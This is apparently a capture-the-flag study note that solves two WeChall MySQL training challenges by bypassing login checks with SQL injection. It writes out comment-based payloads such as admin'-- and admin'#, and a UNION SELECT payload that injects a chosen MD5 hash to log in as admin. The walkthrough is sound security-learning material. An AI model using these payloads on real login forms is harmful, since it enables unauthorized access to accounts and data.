- [Tricks](#tricks)
- [WeChall](#wechall)
    - [MySQL I](#mysql-i)
        - [Challenge](#challenge)
        - [Solution](#solution)
    - [MySQL II](#mysql-ii)
        - [Challenge](#challenge)
        - [Solution](#solution)
- [Useful Links](#useful-links)

# Tricks
* When there is no md5 password check, can use comment in the query like `admin'--` and `admin'#`.
* When there is md5 password check, first use md5 to calculate the hash of a string (password). Then we can use UNION to join another custom defined query result to make the query `SELECT * FROM users WHERE username = '$username'` to `SELECT * FROM users WHERE username = 'aaa' UNION SELECT 01234567890, 'admin', '83832391027a1f2f4d46ef882ff3a47d'`.

# WeChall
## MySQL I
### Challenge
http://www.wechall.net/challenge/training/mysql/auth_bypass1/index.php

### Solution
Looking at the given source code
```
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

if (false === ($result = $db->queryFirst($query))) {
    echo GWF_HTML::error('Auth1', $chall->lang('err_unknown'), false); # Unknown user
    return false;
}
```
There is no password check. So we will just skip the password part of the query using comment. Try to use comment `--` and pass in `admin'--` to username
```
GDO Error(1064): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'd41d8cd98f00b204e9800998ecf8427e'' at line 1\
SELECT * FROM users WHERE username='admin'--' AND password='d41d8cd98f00b204e9800998ecf8427e'
```
Then try to use PHP comment to skip that part and pass in `admin'#` to username and solve.

## MySQL II
### Challenge
http://www.wechall.net/challenge/training/mysql/auth_bypass2/index.php

### Solution
Looking at the given source code
```
CREATE TABLE IF NOT EXISTS users (
    userid    INT(11)       UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    username  VARCHAR(32)   CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
    password  CHAR(32)      CHARACTER SET ascii COLLATE ascii_bin NOT NULL
) ENGINE=myISAM;

$password = md5($password);
$query = "SELECT * FROM users WHERE username='$username'";

if (false === ($result = $db->queryFirst($query))) {
    echo GWF_HTML::error('Auth2', $chall->lang('err_unknown'), false);
    return false;
}

#############################
### This is the new check ###
if ($result['password'] !== $password) {
    echo GWF_HTML::error('Auth2', $chall->lang('err_password'), false);
    return false;
}
```
Here, we login and use md5 result to check the password.\
Looking at the table, 11 digits for userid, less than 32 characters for username and 32 characters for password.
```
[root@5afe7ad7c386 Cryptography]# python -c "import hashlib;print(hashlib.md5('han'.encode('utf-8')).hexdigest())"
83832391027a1f2f4d46ef882ff3a47d
```
We can use `UNION`.\
Use `aaa' UNION SELECT 01234567890, 'admin', '83832391027a1f2f4d46ef882ff3a47d` as username and `han` as password.

# Useful Links
* [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
